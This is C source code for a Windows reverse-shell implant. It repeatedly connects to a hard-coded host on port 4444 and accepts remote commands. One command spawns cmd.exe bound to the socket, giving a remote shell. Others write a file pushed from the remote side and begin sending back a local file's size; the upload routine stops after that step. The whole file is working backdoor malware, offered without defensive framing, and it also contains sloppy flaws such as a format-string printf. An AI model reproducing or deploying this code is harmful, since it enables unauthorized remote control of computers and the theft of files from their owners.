#include <stdio.h>
#include <stdlib.h>
#include<winsock2.h>
#include<Windows.h>
#include<process.h>
#include<io.h>
#include "helper.h"
#define DEFAULT_BUFLEN 2048

#pragma comment(lib, "ws2_32.lib")
#pragma warning(disable:4996) 
void CreateShell(int port);
int startup();
void recieve();
void auth();
int findSize(char file_name[]);
void upload();
int port = 4444;
SOCKET sockt; //global sockt
int main() {
	while (TRUE) {
		//search for connection every 5 seconds
		Sleep(5000);
		int con = startup();
		// waiting for a connection checks every 5 seconds
		if (con == 1) {
			char RecvData[DEFAULT_BUFLEN];
			while (TRUE) {
				memset(RecvData, 0, sizeof(RecvData));
				int RecvCode = recv(sockt, RecvData, DEFAULT_BUFLEN, 0);

				if (strcmp(RecvData, "conend\n") == 0) {//if user sends exit then program ends
					closesocket(sockt);
					WSACleanup();
					exit(0);
				}
				else if (strcmp(RecvData, "shell\n") == 0) {// starts shell process if user types shell
					//start shell process
					CreateShell(port);
				}
				else if (strcmp(RecvData, "send\n") == 0) {// starts send process
					recieve();
				}
				else if (strcmp(RecvData, "download\n") == 0) {
					upload();
				}

			}
		}
	
	}
	return 0;
}  
void CreateShell(int port) {
		STARTUPINFO ini_processo;
		PROCESS_INFORMATION processo_info;
		memset(&ini_processo, 0, sizeof(ini_processo));
		char command[] = "cmd.exe";

		ini_processo.cb = sizeof(ini_processo);
		ini_processo.dwFlags = (STARTF_USESTDHANDLES);
		ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)sockt;

		CreateProcessA(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info); //create shell
		WaitForSingleObject(processo_info.hProcess, INFINITE); //wait for user to close shell on their end

		//cleanup of threads
		CloseHandle(processo_info.hThread);
		CloseHandle(processo_info.hProcess);
	
}
int startup() {
	WSADATA wsa;
	struct sockaddr_in revsockaddr;
	printf("\nstarting WINSOCK...");
	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
	{
		printf("\nfailed startup");

	}

	printf("\nsuccessfully started");

	if ((sockt = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL)) == INVALID_SOCKET)
	{
		printf("socket could not be created");
	}

	revsockaddr.sin_family = AF_INET;
	revsockaddr.sin_port = htons(port);
	revsockaddr.sin_addr.s_addr = inet_addr("192.168.1.3");

	printf("\nsocket created ");


	if (WSAConnect(sockt, (struct sockaddr*) & revsockaddr, sizeof(revsockaddr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
		closesocket(sockt);
		WSACleanup();
		return 0;
	}
	return 1;
}
void recieve() {
	//recv filename from server
	char filename[DEFAULT_BUFLEN];
	memset(filename, 0, sizeof(filename));
	recv(sockt, filename, DEFAULT_BUFLEN, 0);
	
	//wait for binary flag
	unsigned char buffer[DEFAULT_BUFLEN];
	memset(buffer, 0, sizeof(buffer));
	printf(filename);
	auth(); //1 byte ACK
	
	//find file size being sent
	char tmp[10];
	memset(tmp, 0, 10); //maximum of 10^10 byte file
	int totalbytes = 0; //find total number of bytes being send
	int recvbytes = 0;
	recv(sockt, tmp, 10, 0); //gets 10 bytes
	totalbytes = atoi(tmp);
	printf(tmp);
	auth();

	FILE* ptr = fopen(filename, "wb"); //if buffer == B then write bytes else just write
	int extra = (totalbytes % DEFAULT_BUFLEN);
	
	char* tmpbuff = NULL; 
	while (tmpbuff == NULL) //prevent tmpbuff being null
		tmpbuff = malloc(extra * sizeof(char)); //makes tmpbuff size of remainder buff

	while (recvbytes < totalbytes) {
		if (totalbytes - recvbytes < DEFAULT_BUFLEN) {
			recv(sockt, tmpbuff, extra, MSG_WAITALL);
			fwrite(tmpbuff, extra, 1, ptr);
			free(tmpbuff);
			break;
		}
		int bytesrecv = recv(sockt, buffer, 2048, MSG_WAITALL);
		fwrite(buffer, bytesrecv, 1, ptr);
		recvbytes += bytesrecv;
	}
	fclose(ptr); //close file
	auth();
}
void upload() {
	char file_path[DEFAULT_BUFLEN] = { '\0' }; // ititialize to all zeros
	recv(sockt, file_path, DEFAULT_BUFLEN, 0);
	auth();

	int size = findSize(file_path); //get filesize

	if (size != -1) {
		char sizechar[8] = { '\0' };
		sprintf(sizechar, "%d", size);
		send(sockt, sizechar, sizeof(sizechar), 0); //send file size

	}

}
